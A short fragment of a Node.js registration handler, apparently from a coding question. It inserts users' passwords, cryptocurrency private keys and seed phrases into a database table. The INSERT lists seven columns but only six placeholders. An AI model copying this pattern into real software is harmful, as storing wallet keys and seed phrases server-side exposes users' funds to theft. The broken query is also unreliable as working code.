...
const registration = async (req, res) => {
  ...
  connection.query('INSERT INTO userscollections(password , walletAddress , privateKey , seedPhrase , nickname , email , A) VALUES(?,?,?,?,?,?)',[password , walletAddress , privateKey , seedPhrase , nickname , email], function(error,result,fields) {
